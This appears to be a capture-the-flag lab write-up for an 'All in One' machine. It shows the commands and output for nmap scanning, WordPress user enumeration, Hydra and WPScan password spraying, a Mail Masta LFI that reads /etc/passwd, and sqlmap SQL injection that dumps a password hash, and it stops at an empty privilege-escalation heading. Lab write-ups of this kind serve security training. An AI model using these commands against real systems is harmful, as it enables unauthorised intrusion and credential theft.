# All in One
## Information Gathering
## Enumeration and Scanning
```
mkdir ~/Desktop/AllinOne
cd ~/Desktop/AllinOne
nmap -sT -sV -O -p- --script "vuln" -T5 -oN TARGET_IP_scan.nmap TARGET_IP
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```
```
nmap -p21,22,80 --script "safe" -T5 -oN TARGET_IP_scan1.nmap TARGET_IP
```
```
PORT   STATE SERVICE
21/tcp open  ftp
|_banner: 220 (vsFTPd 3.0.3)
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.1.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (EdDSA)
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|   server_host_key_algorithms: (5)
|   encryption_algorithms: (6)
|   mac_algorithms: (10)
|_  compression_algorithms: (2)
80/tcp open  http
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-74-123.eu-west-1.compute.internal
|     
|     Path: http://ip-10-10-74-123.eu-west-1.compute.internal/#about
|     Line number: 4
|     Comment: 
|         <!--
|             Modified from the Debian original for Ubuntu
|             Last updated: 2016-11-16
|             See: https://launchpad.net/bugs/1288690
|           -->
|     
|     Path: http://ip-10-10-74-123.eu-west-1.compute.internal/#about
|     Line number: 201
|     Comment: 
|         <!--      <div class="table_of_contents floating_element">
|                 <div class="section_header section_header_grey">
|                   TABLE OF CONTENTS
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#about">About</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#changes">Changes</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#scope">Scope</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#files">Config files</a>
|                 </div>
|               </div>
|_        -->
|_http-date: Mon, 26 Feb 2024 18:10:39 GMT; 0s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Date: Mon, 26 Feb 2024 18:10:38 GMT
|   Server: Apache/2.4.29 (Ubuntu)
|   Last-Modified: Mon, 05 Oct 2020 19:44:00 GMT
|   ETag: "2aa6-5b0f1b4359fd1"
|   Accept-Ranges: bytes
|   Content-Length: 10918
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-title: Apache2 Ubuntu Default Page: It works
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
```
### Nessus scan results.
* 4 x medium severity.
  * SSH Terrapin Prefix Truncation Weakness (CVE-2023-48795) is only vulnerability with public exploit.
* 2 x Low severity.
  * No public exploits.

## Application Testing
### TCP/21
* vsftpd 3.0.3
* Connected anonymously - no files or folders exposed.
```
ftp 10.10.74.123
Connected to 10.10.74.123.
220 (vsFTPd 3.0.3)
Name (10.10.74.123:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp>bye
```
### TCP/22
* OpenSSH 7.6p1.
  * Could not connect anonymously.
```
ssh anonymous@TARGET_IP
The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
ECDSA key fingerprint is SHA256:IVzQLYHc196APvwnH40vFHjOR4ZsfNqxHnOG3HuzXgg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'TARGET_IP' (ECDSA) to the list of known hosts.
anonymous@TARGET_IP's password: 
Permission denied, please try again.
```
### TCP/80
* Search for hidden directories using Gobuster.
```
gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt 
```
```
/wordpress (Status: 301)
/hackathons (Status: 200)
/server-status (Status: 403)
```
#### /wordpress/
* "All in One" page published with "elyana" as author.
* Enumerate Wordpress users using Metasploit.
```
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set rhosts TARGET_IP
msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
msf auxiliary(wordpress_login_enum) > set user_file /usr/share/wordlists/rockyou.txt
msf auxiliary(wordpress_login_enum) > set pass_file /usr/share/wordlists/rockyou.txt
msf auxiliary(wordpress_login_enum) > exploit
```
```
[+] /wordpress - Found user 'elyana' with id 1
[...snip...]
[*] /wordpress/ - WordPress User-Validation - Checking Username:'elyana'
[+] /wordpress/ - WordPress User-Validation - Username: 'elyana' - is VALID

```
#### wordpress/wp-login.php
* Internet search reveals that default Wordpress credentials are admin / password.
 * Trying these resulted in "Unknown username. Check again or try your email address." message.
 * Attempting to logon using username "elyana" results in "Error: The password you entered for the username elyana is incorrect." message.
#### /hackathons directory
* Displays "Damn how much I hate the smell of *Vinegar :/* !!!" 
* Viewing page source displays comments at bottom of page.
```
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```
## Vulnerablity Research
### vsftpd 3.0.3
* No public exploits listed on Exploit db.
### OpenSSH 7.6p1.
* Vulnerable to CVE-2018-15473 - username enumeration (https://www.exploit-db.com/exploits/4521080)
  * Enumerate openSSH users?
### Apache 2.4.29
* No public exploits on Exploit db.
### WordPress
* Use "wpscan" to identify vulnerabilites.
```
wpscan --update
wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
```
* WordPress v5.5.1.
  * v6.5 Beta 2 is current.
  * No public exploits listed on Exploit db.
* twentytwenty theme v1.5 out of date.
  * v2.5 is current.
  * No public exploits listed on Exploit db.
* Mail Masta plugin v1.0.
  * Vulnerable to [Multiple SQL injection vulnerabilities](https://www.exploit-db.com/exploits/41438).
    * CVE-2017-6095, CVE-2017-6096, CVE-2017-6097, CVE-2017-6098.
  * Vulnerable to [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/40290) public exploit listed on Exploit db.
> The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.
* Reflex Gallery 3.1.7.
  * No public exploits listed on Exploit db.
## Exploitation
### Initial Access
#### Password spray WordPress using Hydra.
```
hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
```
#### Password spray WordPress using WPscan.
```
# sudo wpscan --password-attack xmlrpc -t 20 -U <username> -P /usr/share/wordlists/rockyou.txt --url <url>
sudo wpscan --password-attack xmlrpc -t 20 -U elyana  -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
```
#### Exploit Mail Masta LFI vulnerability.
> "pl" parameter allows inclusion of a file without any type of input validation or sanitisation. Can attempt to include arbitrary files on the webserver. E.g. display contents of /etc/passwd file using cURL.
```
curl -s http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```
* Elyana user is only other user other than root with "/bin/bash" shell access.
#### Exploit Mail Masta SQLi.
* Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated).
* GET Parameter: list_id
**Enumerate databases**
```
sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
```
* `-u` specifies target URL.
* `--dbs` tells SQLMap to try to enumerate database.
```
available databases [2]:
[*] information_schema
[*] wordpress
```
**List tables within "wordpress" database**
```
sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress --tables

Database: wordpress
[23 tables]
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_reflex_gallery          |
| wp_reflex_gallery_images   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
```
**List columns within "wp_users" table**
```
sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns

Database: wordpress
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+
```
**Dump contents of "wp_users" table**
```
Database: wordpress
Table: wp_users
[1 entry]
+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url                       | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | elyana     | none@none.com | 0           | elyana       | elyana        | 2020-10-05 19:55:50 | <blank>             |
+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
```

## Privilege Escalation
